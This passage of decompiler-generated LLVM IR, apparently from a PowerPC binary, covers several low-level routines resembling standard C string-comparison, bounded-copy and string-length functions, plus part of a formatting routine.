  store i32 %v1_10006fd8, i32* @r4, align 4
  %v4_10006fdc.not = icmp ne i8 %v3_10006fb8, %v3_10006fc0
  %brmerge1 = or i1 %v3_10006fc8, %v4_10006fdc.not
  br i1 %brmerge1, label %dec_label_pc_10007000, label %dec_label_pc_10006fe8

dec_label_pc_10006fe8:                            ; preds = %dec_label_pc_10006fb8
  %v1_10006fc4 = add i32 %v0_10006fc0, 2
  %v1_10006fbc = add i32 %v0_10006fb8, 2
  %v2_10006fe8 = inttoptr i32 %v1_10006fbc to i8*
  %v3_10006fe8 = load i8, i8* %v2_10006fe8, align 1
  %v2_10006fec = inttoptr i32 %v1_10006fc4 to i8*
  %v3_10006fec = load i8, i8* %v2_10006fec, align 1
  %v3_10006ff0 = icmp eq i8 %v3_10006fe8, 0
  %v4_10006ff4.not = icmp ne i8 %v3_10006fe8, %v3_10006fec
  %brmerge2 = or i1 %v3_10006ff0, %v4_10006ff4.not
  br i1 %brmerge2, label %dec_label_pc_10007000, label %dec_label_pc_10007008

dec_label_pc_10007000:                            ; preds = %dec_label_pc_10006fe8, %dec_label_pc_10006fb8, %dec_label_pc_10006f98
  %v1_10007000.in = phi i8 [ %v3_10006fe8, %dec_label_pc_10006fe8 ], [ %v3_10006fb8, %dec_label_pc_10006fb8 ], [ %v2_10006f98, %dec_label_pc_10006f98 ]
  %v0_10007000.in = phi i8 [ %v3_10006fec, %dec_label_pc_10006fe8 ], [ %v3_10006fc0, %dec_label_pc_10006fb8 ], [ %v2_10006fa0, %dec_label_pc_10006f98 ]
  %v0_10007000 = zext i8 %v0_10007000.in to i32
  %v1_10007000 = zext i8 %v1_10007000.in to i32
  %v2_10007000 = sub nsw i32 %v1_10007000, %v0_10007000
  ret i32 %v2_10007000

dec_label_pc_10007008:                            ; preds = %dec_label_pc_10006fe8
  %v2_10007008 = inttoptr i32 %v1_10006fcc to i8*
  %v3_10007008 = load i8, i8* %v2_10007008, align 1
  %v4_10007008 = zext i8 %v3_10007008 to i32
  %v2_1000700c = inttoptr i32 %v1_10006fd0 to i8*
  %v3_1000700c = load i8, i8* %v2_1000700c, align 1
  %v4_1000700c = zext i8 %v3_1000700c to i32
  %v3_10007010 = icmp eq i8 %v3_10007008, 0
  %v4_10007014.not = icmp ne i8 %v3_10007008, %v3_1000700c
  %brmerge3 = or i1 %v3_10007010, %v4_10007014.not
  br i1 %brmerge3, label %dec_label_pc_1000704c, label %dec_label_pc_10007020

dec_label_pc_10007020:                            ; preds = %dec_label_pc_10007008
  %v1_10007020 = add i32 %v0_10007020, -1
  %v2_10007020 = icmp eq i32 %v1_10007020, 0
  br i1 %v2_10007020, label %dec_label_pc_10007024, label %dec_label_pc_10006f98

dec_label_pc_10007024:                            ; preds = %dec_label_pc_10007020
  %v1_10007024 = urem i32 %arg2, 4
  br label %dec_label_pc_10007054

dec_label_pc_1000702c:                            ; preds = %dec_label_pc_1000705c
  %v1_1000702c = inttoptr i32 %v0_1000702c to i8*
  %v2_1000702c = load i8, i8* %v1_1000702c, align 1
  %v3_1000702c = zext i8 %v2_1000702c to i32
  %v1_10007030 = add i32 %v0_1000702c, 1
  %v0_10007034 = load i32, i32* @r4, align 4
  %v1_10007034 = inttoptr i32 %v0_10007034 to i8*
  %v2_10007034 = load i8, i8* %v1_10007034, align 1
  %v3_10007034 = zext i8 %v2_10007034 to i32
  %v1_10007038 = add i32 %v0_10007034, 1
  store i32 %v1_10007038, i32* @r4, align 4
  %v3_1000703c = icmp eq i8 %v2_1000702c, 0
  %v4_10007040.not = icmp ne i8 %v2_1000702c, %v2_10007034
  %brmerge4 = or i1 %v3_1000703c, %v4_10007040.not
  br i1 %brmerge4, label %dec_label_pc_1000704c, label %dec_label_pc_1000705c

dec_label_pc_1000704c:                            ; preds = %dec_label_pc_10007008, %dec_label_pc_1000702c
  %v1_1000704c = phi i32 [ %v3_1000702c, %dec_label_pc_1000702c ], [ %v4_10007008, %dec_label_pc_10007008 ]
  %v0_1000704c = phi i32 [ %v3_10007034, %dec_label_pc_1000702c ], [ %v4_1000700c, %dec_label_pc_10007008 ]
  %v2_1000704c = sub nsw i32 %v1_1000704c, %v0_1000704c
  ret i32 %v2_1000704c

dec_label_pc_10007054:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_10007024
  %v1_1000706020 = phi i32 [ 0, %dec_label_pc_10006f7c ], [ %v4_10007008, %dec_label_pc_10007024 ]
  %v0_1000706018 = phi i32 [ 0, %dec_label_pc_10006f7c ], [ %v4_1000700c, %dec_label_pc_10007024 ]
  %v0_1000702c14 = phi i32 [ %tmp, %dec_label_pc_10006f7c ], [ %v1_10006fd4, %dec_label_pc_10007024 ]
  %v0_10007054 = phi i32 [ %arg2, %dec_label_pc_10006f7c ], [ %v1_10007024, %dec_label_pc_10007024 ]
  %v1_10007054 = add i32 %v0_10007054, 1
  br label %dec_label_pc_1000705c

dec_label_pc_1000705c:                            ; preds = %dec_label_pc_1000702c, %dec_label_pc_10007054
  %v1_10007060 = phi i32 [ %v3_1000702c, %dec_label_pc_1000702c ], [ %v1_1000706020, %dec_label_pc_10007054 ]
  %v0_10007060 = phi i32 [ %v3_10007034, %dec_label_pc_1000702c ], [ %v0_1000706018, %dec_label_pc_10007054 ]
  %v0_1000702c = phi i32 [ %v1_10007030, %dec_label_pc_1000702c ], [ %v0_1000702c14, %dec_label_pc_10007054 ]
  %v0_1000705c = phi i32 [ %v1_1000705c, %dec_label_pc_1000702c ], [ %v1_10007054, %dec_label_pc_10007054 ]
  %v1_1000705c = add i32 %v0_1000705c, -1
  %v2_1000705c = icmp eq i32 %v1_1000705c, 0
  br i1 %v2_1000705c, label %dec_label_pc_10007060, label %dec_label_pc_1000702c

dec_label_pc_10007060:                            ; preds = %dec_label_pc_1000705c
  %v2_10007060 = sub nsw i32 %v1_10007060, %v0_10007060
  ret i32 %v2_10007060

; uselistorder directives
  uselistorder i32 %v1_1000705c, { 1, 0 }
  uselistorder i32 %v3_10007034, { 1, 0 }
  uselistorder i32 %v3_1000702c, { 1, 0 }
  uselistorder i32 %v1_10007020, { 1, 0 }
  uselistorder i32 %v4_1000700c, { 1, 0 }
  uselistorder i32 %v4_10007008, { 1, 0 }
  uselistorder i32 %v1_10006fd8, { 1, 0 }
  uselistorder i32 %v0_10006fb8, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_10006fc0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000705c, { 1, 0 }
  uselistorder label %dec_label_pc_10007054, { 1, 0 }
  uselistorder label %dec_label_pc_1000704c, { 1, 0 }
}

define i32 @function_10007068(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007068:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10007068 = icmp eq i32 %arg2, 3
  store i1 %v3_10007068, i1* %cr7_eq.global-to-local, align 1
  %v1_1000706c = add i32 %arg1, -1
  store i32 %v1_1000706c, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_100070e8, label %dec_label_pc_10007074

dec_label_pc_10007074:                            ; preds = %dec_label_pc_10007068
  %v1_10007074 = udiv i32 %arg2, 4
  store i32 %v1_10007074, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000707c

dec_label_pc_1000707c:                            ; preds = %dec_label_pc_100070cc, %dec_label_pc_10007074
  %v2_1000708c = phi i32 [ %v3_100070c4, %dec_label_pc_100070cc ], [ %v1_1000706c, %dec_label_pc_10007074 ]
  %v0_1000707c = load i32, i32* @r4, align 4
  %v1_1000707c = inttoptr i32 %v0_1000707c to i8*
  %v2_1000707c = load i8, i8* %v1_1000707c, align 1
  %v1_10007080 = add i32 %v0_1000707c, 1
  store i32 %v1_10007080, i32* %r10.global-to-local, align 4
  %v1_10007084 = add i32 %v0_1000707c, 2
  store i32 %v1_10007084, i32* %r8.global-to-local, align 4
  %v3_10007088 = icmp eq i8 %v2_1000707c, 0
  store i1 %v3_10007088, i1* %cr7_eq.global-to-local, align 1
  %v3_1000708c = add i32 %v2_1000708c, 1
  %v4_1000708c = inttoptr i32 %v3_1000708c to i8*
  store i8 %v2_1000707c, i8* %v4_1000708c, align 1
  store i32 %v3_1000708c, i32* %r11.global-to-local, align 4
  %v0_10007090 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007090 = add i32 %v0_10007090, 1
  store i32 %v1_10007090, i32* %r9.global-to-local, align 4
  %v0_10007094 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007094, label %dec_label_pc_100070d4, label %dec_label_pc_10007098

dec_label_pc_10007098:                            ; preds = %dec_label_pc_1000707c
  %v0_10007098 = load i32, i32* @r4, align 4
  %v1_10007098 = add i32 %v0_10007098, 1
  %v2_10007098 = inttoptr i32 %v1_10007098 to i8*
  %v3_10007098 = load i8, i8* %v2_10007098, align 1
  %v1_1000709c = add i32 %v0_10007090, 2
  store i32 %v1_1000709c, i32* @r4, align 4
  %v3_100070a0 = icmp eq i8 %v3_10007098, 0
  store i1 %v3_100070a0, i1* %cr7_eq.global-to-local, align 1
  %v3_100070a4 = add i32 %v2_1000708c, 2
  %v4_100070a4 = inttoptr i32 %v3_100070a4 to i8*
  store i8 %v3_10007098, i8* %v4_100070a4, align 1
  store i32 %v3_100070a4, i32* %r11.global-to-local, align 4
  %v0_100070a8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070a8, label %dec_label_pc_100070d4, label %dec_label_pc_100070ac

dec_label_pc_100070ac:                            ; preds = %dec_label_pc_10007098
  %v0_100070ac = load i32, i32* %r10.global-to-local, align 4
  %v1_100070ac = add i32 %v0_100070ac, 1
  %v2_100070ac = inttoptr i32 %v1_100070ac to i8*
  %v3_100070ac = load i8, i8* %v2_100070ac, align 1
  %v3_100070b0 = icmp eq i8 %v3_100070ac, 0
  store i1 %v3_100070b0, i1* %cr7_eq.global-to-local, align 1
  %v3_100070b4 = add i32 %v2_1000708c, 3
  %v4_100070b4 = inttoptr i32 %v3_100070b4 to i8*
  store i8 %v3_100070ac, i8* %v4_100070b4, align 1
  store i32 %v3_100070b4, i32* %r11.global-to-local, align 4
  %v0_100070b8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070b8, label %dec_label_pc_100070d4, label %dec_label_pc_100070bc

dec_label_pc_100070bc:                            ; preds = %dec_label_pc_100070ac
  %v0_100070bc = load i32, i32* %r8.global-to-local, align 4
  %v1_100070bc = add i32 %v0_100070bc, 1
  %v2_100070bc = inttoptr i32 %v1_100070bc to i8*
  %v3_100070bc = load i8, i8* %v2_100070bc, align 1
  %v3_100070c0 = icmp eq i8 %v3_100070bc, 0
  store i1 %v3_100070c0, i1* %cr7_eq.global-to-local, align 1
  %v3_100070c4 = add i32 %v2_1000708c, 4
  %v4_100070c4 = inttoptr i32 %v3_100070c4 to i8*
  store i8 %v3_100070bc, i8* %v4_100070c4, align 1
  store i32 %v3_100070c4, i32* %r11.global-to-local, align 4
  %v0_100070c8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100070c8, label %dec_label_pc_100070d4, label %dec_label_pc_100070cc

dec_label_pc_100070cc:                            ; preds = %dec_label_pc_100070bc
  %v0_100070cc = load i32, i32* %ctr.global-to-local, align 4
  %v1_100070cc = add i32 %v0_100070cc, -1
  store i32 %v1_100070cc, i32* %ctr.global-to-local, align 4
  %v2_100070cc = icmp eq i32 %v1_100070cc, 0
  br i1 %v2_100070cc, label %dec_label_pc_100070e8, label %dec_label_pc_1000707c

dec_label_pc_100070d4:                            ; preds = %dec_label_pc_100070bc, %dec_label_pc_100070ac, %dec_label_pc_10007098, %dec_label_pc_1000707c
  %v1_100070d4 = phi i32 [ %v3_100070c4, %dec_label_pc_100070bc ], [ %v3_100070b4, %dec_label_pc_100070ac ], [ %v3_100070a4, %dec_label_pc_10007098 ], [ %v3_1000708c, %dec_label_pc_1000707c ]
  %v2_100070d411 = sub i32 %arg1, %v1_100070d4
  %v2_100070d8 = add i32 %v2_100070d411, %arg2
  %v1_100070dc = add i32 %v2_100070d8, -1
  store i32 %v1_100070dc, i32* %r9.global-to-local, align 4
  %v4_100070dc = icmp eq i32 %v1_100070dc, 0
  %v0_100070e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100070dc, i32 %v0_100070e0)
  %v2_10007118.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007110

dec_label_pc_100070e8:                            ; preds = %dec_label_pc_100070cc, %dec_label_pc_10007068
  %v1_100070e8 = urem i32 %arg2, 4
  store i32 %v1_100070e8, i32* %r9.global-to-local, align 4
  %v3_100070e8 = icmp eq i32 %v1_100070e8, 0
  %v0_100070ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100070e8, i32 %v0_100070ec)
  store i32 %v1_100070e8, i32* %ctr.global-to-local, align 4
  %v2_10007104.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100070f4

dec_label_pc_100070f4:                            ; preds = %dec_label_pc_1000710c.dec_label_pc_100070f4_crit_edge, %dec_label_pc_100070e8
  %v2_10007104 = phi i32 [ %v3_10007104, %dec_label_pc_1000710c.dec_label_pc_100070f4_crit_edge ], [ %v2_10007104.pre, %dec_label_pc_100070e8 ]
  %v0_100070f8 = phi i32 [ %v0_100070f8.pre, %dec_label_pc_1000710c.dec_label_pc_100070f4_crit_edge ], [ %v1_100070e8, %dec_label_pc_100070e8 ]
  %v0_100070f4 = load i32, i32* @r4, align 4
  %v1_100070f4 = inttoptr i32 %v0_100070f4 to i8*
  %v2_100070f4 = load i8, i8* %v1_100070f4, align 1
  %v1_100070f8 = add i32 %v0_100070f8, -1
  store i32 %v1_100070f8, i32* %r9.global-to-local, align 4
  %v1_100070fc = add i32 %v0_100070f4, 1
  store i32 %v1_100070fc, i32* @r4, align 4
  %v3_10007100 = icmp eq i8 %v2_100070f4, 0
  store i1 %v3_10007100, i1* %cr7_eq.global-to-local, align 1
  %v3_10007104 = add i32 %v2_10007104, 1
  %v4_10007104 = inttoptr i32 %v3_10007104 to i8*
  store i8 %v2_100070f4, i8* %v4_10007104, align 1
  store i32 %v3_10007104, i32* %r11.global-to-local, align 4
  %v0_10007108 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007108 = add i32 %v0_10007108, -1
  store i32 %v1_10007108, i32* %ctr.global-to-local, align 4
  %v2_10007108 = icmp eq i32 %v1_10007108, 0
  br i1 %v2_10007108, label %dec_label_pc_10007120, label %dec_label_pc_1000710c

dec_label_pc_1000710c:                            ; preds = %dec_label_pc_100070f4
  %v0_1000710c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000710c, label %dec_label_pc_10007110, label %dec_label_pc_1000710c.dec_label_pc_100070f4_crit_edge

dec_label_pc_1000710c.dec_label_pc_100070f4_crit_edge: ; preds = %dec_label_pc_1000710c
  %v0_100070f8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100070f4

dec_label_pc_10007110:                            ; preds = %dec_label_pc_1000710c, %dec_label_pc_100070d4
  %v2_10007118.pre = phi i32 [ %v2_10007118.pre.pre, %dec_label_pc_100070d4 ], [ %v3_10007104, %dec_label_pc_1000710c ]
  %v0_10007110 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_10007110, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007114

dec_label_pc_10007114:                            ; preds = %dec_label_pc_10007114, %dec_label_pc_10007110
  %v2_10007118 = phi i32 [ %v3_10007118, %dec_label_pc_10007114 ], [ %v2_10007118.pre, %dec_label_pc_10007110 ]
  %v3_10007118 = add i32 %v2_10007118, 1
  %v4_10007118 = inttoptr i32 %v3_10007118 to i8*
  store i8 0, i8* %v4_10007118, align 1
  store i32 %v3_10007118, i32* %r11.global-to-local, align 4
  %v0_1000711c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000711c = add i32 %v0_1000711c, -1
  store i32 %v1_1000711c, i32* %ctr.global-to-local, align 4
  %v2_1000711c = icmp eq i32 %v1_1000711c, 0
  br i1 %v2_1000711c, label %dec_label_pc_10007120, label %dec_label_pc_10007114

dec_label_pc_10007120:                            ; preds = %dec_label_pc_100070f4, %dec_label_pc_10007114
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000711c, { 1, 0 }
  uselistorder i32 %v3_10007118, { 1, 2, 0 }
  uselistorder i32 %v1_10007108, { 1, 0 }
  uselistorder i32 %v3_10007104, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100070e8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100070cc, { 1, 0 }
  uselistorder i32 %v3_100070c4, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007120, { 1, 0 }
}

define i32 @function_10007124(i8* %arg1) local_unnamed_addr {
dec_label_pc_10007124:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10007124 = load i32, i32* @r4, align 4
  %v3_10007124 = icmp eq i32 %v0_10007124, 0
  %v0_10007130 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007124, i32 %v0_10007130)
  %v1_10007140 = load i32, i32* @r4, align 4
  %v2_10007140 = add i32 %v1_10007140, %tmp
  %v3_10007144 = icmp ugt i32 %v2_10007140, %tmp
  %v4_10007144 = icmp eq i32 %v1_10007140, 0
  %v2_10007148 = or i1 %v4_10007144, %v3_10007144
  br i1 %v2_10007148, label %dec_label_pc_10007150, label %dec_label_pc_1000714c

dec_label_pc_10007138:                            ; preds = %dec_label_pc_100071b8
  br label %dec_label_pc_100071fc

dec_label_pc_1000714c:                            ; preds = %dec_label_pc_10007124
  br label %dec_label_pc_10007150

dec_label_pc_10007150:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_1000714c
  %v0_10007200 = phi i32 [ %v2_10007140, %dec_label_pc_10007124 ], [ -1, %dec_label_pc_1000714c ]
  %v1_100071806 = urem i32 %tmp, 4
  %v3_100071808 = icmp eq i32 %v1_100071806, 0
  br i1 %v3_100071808, label %dec_label_pc_10007188, label %dec_label_pc_10007158

dec_label_pc_10007158:                            ; preds = %dec_label_pc_10007150, %dec_label_pc_1000717c
  %v0_10007170 = phi i32 [ %v1_1000717c, %dec_label_pc_1000717c ], [ %tmp, %dec_label_pc_10007150 ]
  %v1_10007158 = inttoptr i32 %v0_10007170 to i8*
  %v2_10007158 = load i8, i8* %v1_10007158, align 1
  %v3_1000715c = icmp eq i8 %v2_10007158, 0
  br i1 %v3_1000715c, label %dec_label_pc_10007164, label %dec_label_pc_1000717c

dec_label_pc_10007164:                            ; preds = %dec_label_pc_10007158
  %v3_10007164 = icmp ugt i32 %v0_10007200, %v0_10007170
  %v0_10007170.v0_10007200 = select i1 %v3_10007164, i32 %v0_10007170, i32 %v0_10007200
  %v2_10007174 = sub i32 %v0_10007170.v0_10007200, %tmp
  ret i32 %v2_10007174

dec_label_pc_1000717c:                            ; preds = %dec_label_pc_10007158
  %v1_1000717c = add i32 %v0_10007170, 1
  %v1_10007180 = urem i32 %v1_1000717c, 4
  %v3_10007180 = icmp eq i32 %v1_10007180, 0
  br i1 %v3_10007180, label %dec_label_pc_10007188, label %dec_label_pc_10007158

dec_label_pc_10007188:                            ; preds = %dec_label_pc_1000717c, %dec_label_pc_10007150
  %v0_1000718c = phi i32 [ %tmp, %dec_label_pc_10007150 ], [ %v1_1000717c, %dec_label_pc_1000717c ]
  %v2_100071f43 = icmp ult i32 %v0_1000718c, %v0_10007200
  br i1 %v2_100071f43, label %dec_label_pc_10007198, label %dec_label_pc_100071fc

dec_label_pc_10007198:                            ; preds = %dec_label_pc_10007188, %dec_label_pc_100071f0
  %v0_10007138 = phi i32 [ %v1_1000719c, %dec_label_pc_100071f0 ], [ %v0_1000718c, %dec_label_pc_10007188 ]
  %v1_10007198 = inttoptr i32 %v0_10007138 to i32*
  %v2_10007198 = load i32, i32* %v1_10007198, align 4
  %v1_1000719c = add i32 %v0_10007138, 4
  %v1_100071a8 = add i32 %v2_10007198, -16843009
  %v2_100071ac = and i32 %v1_100071a8, -2139062144
  %v5_100071ac = icmp eq i32 %v2_100071ac, 0
  %v1_100071b0 = add i32 %v0_10007138, 1
  br i1 %v5_100071ac, label %dec_label_pc_100071f0, label %dec_label_pc_100071b8

dec_label_pc_100071b8:                            ; preds = %dec_label_pc_10007198
  %v2_100071b8 = inttoptr i32 %v0_10007138 to i8*
  %v3_100071b8 = load i8, i8* %v2_100071b8, align 1
  %v3_100071bc = icmp eq i8 %v3_100071b8, 0
  br i1 %v3_100071bc, label %dec_label_pc_10007138, label %dec_label_pc_100071c4

dec_label_pc_100071c4:                            ; preds = %dec_label_pc_100071b8
  %v2_100071c4 = inttoptr i32 %v1_100071b0 to i8*
  %v3_100071c4 = load i8, i8* %v2_100071c4, align 1
  %v3_100071c8 = icmp eq i8 %v3_100071c4, 0
  br i1 %v3_100071c8, label %dec_label_pc_100071fc, label %dec_label_pc_100071d0

dec_label_pc_100071d0:                            ; preds = %dec_label_pc_100071c4
  %v1_100071d0 = add i32 %v0_10007138, 2
  %v2_100071d0 = inttoptr i32 %v1_100071d0 to i8*
  %v3_100071d0 = load i8, i8* %v2_100071d0, align 1
  %v3_100071d8 = icmp eq i8 %v3_100071d0, 0
  br i1 %v3_100071d8, label %dec_label_pc_100071fc, label %dec_label_pc_100071e0

dec_label_pc_100071e0:                            ; preds = %dec_label_pc_100071d0
  %v1_100071e0 = add i32 %v0_10007138, 3
  %v2_100071e0 = inttoptr i32 %v1_100071e0 to i8*
  %v3_100071e0 = load i8, i8* %v2_100071e0, align 1
  %v3_100071e8 = icmp eq i8 %v3_100071e0, 0
  br i1 %v3_100071e8, label %dec_label_pc_100071fc, label %dec_label_pc_100071f0

dec_label_pc_100071f0:                            ; preds = %dec_label_pc_100071e0, %dec_label_pc_10007198
  %v2_100071f4 = icmp ult i32 %v1_1000719c, %v0_10007200
  br i1 %v2_100071f4, label %dec_label_pc_10007198, label %dec_label_pc_100071fc

dec_label_pc_100071fc:                            ; preds = %dec_label_pc_100071f0, %dec_label_pc_100071c4, %dec_label_pc_100071d0, %dec_label_pc_100071e0, %dec_label_pc_10007188, %dec_label_pc_10007138
  %v0_10007208 = phi i32 [ %v0_10007138, %dec_label_pc_10007138 ], [ %v0_1000718c, %dec_label_pc_10007188 ], [ %v1_100071e0, %dec_label_pc_100071e0 ], [ %v1_100071d0, %dec_label_pc_100071d0 ], [ %v1_100071b0, %dec_label_pc_100071c4 ], [ %v0_10007200, %dec_label_pc_100071f0 ]
  %v3_100071fc = icmp ugt i32 %v0_10007200, %v0_10007208
  %v0_10007208.v0_10007200 = select i1 %v3_100071fc, i32 %v0_10007208, i32 %v0_10007200
  %v2_1000720c = sub i32 %v0_10007208.v0_10007200, %tmp
  ret i32 %v2_1000720c

; uselistorder directives
  uselistorder i32 %v1_1000719c, { 1, 0 }
  uselistorder i32 %v0_10007138, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_1000718c, { 1, 0, 2 }
  uselistorder i32 %v1_1000717c, { 1, 0, 2 }
  uselistorder i32 %v0_10007170, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10007200, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_10007140, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_100071fc, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10007198, { 1, 0 }
  uselistorder label %dec_label_pc_10007158, { 1, 0 }
  uselistorder label %dec_label_pc_10007150, { 1, 0 }
}

define i32 @function_10007214(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007214:
  store i32 %arg1, i32* @r4, align 4
  store i32 268464684, i32* @lr, align 4
  %v0_10007228 = call i32 @function_10007244()
  %v0_10007230 = load i32, i32* @r29, align 4
  ret i32 %v0_10007230
}

define i32 @function_10007244() local_unnamed_addr {
dec_label_pc_10007244:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_10007244 = load i32, i32* @r3, align 4
  %v2_10007244 = icmp ugt i32 %v0_10007244, 124
  %v0_10007254 = load i32, i32* @r4, align 4
  store i32 %v0_10007254, i32* %r27.global-to-local, align 4
  %v0_1000725c = load i32, i32* @r5, align 4
  br i1 %v2_10007244, label %dec_label_pc_100072a0, label %dec_label_pc_10007264

dec_label_pc_10007264:                            ; preds = %dec_label_pc_10007244
  store i32 ptrtoint ([8 x i8]* @global_var_1000e10c.244 to i32), i32* %r30.global-to-local, align 4
  %v3_100072807 = icmp eq i32 %v0_10007244, 0
  br i1 %v3_100072807, label %dec_label_pc_10007294, label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %dec_label_pc_10007264, %dec_label_pc_10007274
  %v0_10007278 = phi i32 [ %v1_10007278, %dec_label_pc_10007274 ], [ ptrtoint ([8 x i8]* @global_var_1000e10c.244 to i32), %dec_label_pc_10007264 ]
  %v1_10007278 = add i32 %v0_10007278, 1
  store i32 %v1_10007278, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007274

dec_label_pc_10007294:                            ; preds = %dec_label_pc_10007264
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100072d4

dec_label_pc_100072a0:                            ; preds = %dec_label_pc_10007244
  %tmp = icmp slt i32 %v0_10007244, 0
  %v1_100072a4 = zext i1 %tmp to i32
  %v2_100072a4 = ashr i32 %v0_10007244, 31
  %v3_100072a4 = and i32 %v2_100072a4, -2
  %v4_100072a4 = or i32 %v3_100072a4, %v1_100072a4
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_100072b8 = bitcast i32* %stack_var_-39 to i8*
  %v6_100072b8 = call i32 @function_10009af0(i8* %v5_100072b8, i32 %v4_100072a4, i32 %v0_10007244, i32 -10, i32 0)
  %v1_100072c0 = add i32 %v6_100072b8, -14
  store i32 %v1_100072c0, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000e0fc.245 to i32), i32* @r4, align 4
  store i32 %v1_100072c0, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268464852, i32* @lr, align 4
  %v0_100072d0 = call i32 @function_10006d8c()
  %v0_100072d4.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100072d8.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100072e8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100072d4

dec_label_pc_100072d4:                            ; preds = %dec_label_pc_10007294, %dec_label_pc_100072a0
  %v0_100072e8 = phi i32 [ %v0_1000725c, %dec_label_pc_10007294 ], [ %v0_100072e8.pre, %dec_label_pc_100072a0 ]
  %v0_100072d8 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000e10c.244 to i32), %dec_label_pc_10007294 ], [ %v0_100072d8.pre, %dec_label_pc_100072a0 ]
  %v1_100072dc = phi i32 [ %v0_10007254, %dec_label_pc_10007294 ], [ %v0_100072d4.pre, %dec_label_pc_100072a0 ]
  %tmp19 = icmp slt i32 %v1_100072dc, 0
  %v1_100072d4 = zext i1 %tmp19 to i32
  %v2_100072d4 = ashr i32 %v1_100072dc, 31
  %v3_100072d4 = and i32 %v2_100072d4, -2
  %v4_100072d4 = or i32 %v3_100072d4, %v1_100072d4
  store i32 %v0_100072d8, i32* @r3, align 4
  %v2_100072dc = xor i32 %v4_100072d4, %v1_100072dc
  %v2_100072e0 = sub i32 %v4_100072d4, %v2_100072dc
  %tmp20 = icmp slt i32 %v2_100072e0, 0
  %v1_100072e4 = zext i1 %tmp20 to i32
  %v2_100072e4 = ashr i32 %v2_100072e0, 31
  %v3_100072e4 = and i32 %v2_100072e4, -2
  %v4_100072e4 = or i32 %v3_100072e4, %v1_100072e4
  %v2_100072e8 = and i32 %v4_100072e4, %v0_100072e8
  store i32 %v2_100072e8, i32* @r29, align 4
  %v0_100072ec = call i32 @function_10006ed8()
  %v1_100072f0 = add i32 %v0_100072ec, 1
  store i32 %v1_100072f0, i32* %r31.global-to-local, align 4
  %v1_100072f4 = load i32, i32* @r29, align 4
  %v3_100072f4 = icmp ugt i32 %v1_100072f0, %v1_100072f4
  br i1 %v3_100072f4, label %dec_label_pc_100072fc, label %dec_label_pc_10007304

dec_label_pc_100072fc:                            ; preds = %dec_label_pc_100072d4
  store i32 %v1_100072f4, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007304

dec_label_pc_10007304:                            ; preds = %dec_label_pc_100072d4, %dec_label_pc_100072fc
  %v0_10007314 = phi i32 [ %v1_100072f4, %dec_label_pc_100072fc ], [ %v1_100072f0, %dec_label_pc_100072d4 ]
  %v3_10007304 = icmp eq i32 %v0_10007314, 0
  br i1 %v3_10007304, label %dec_label_pc_10007328, label %dec_label_pc_1000730c

dec_label_pc_1000730c:                            ; preds = %dec_label_pc_10007304
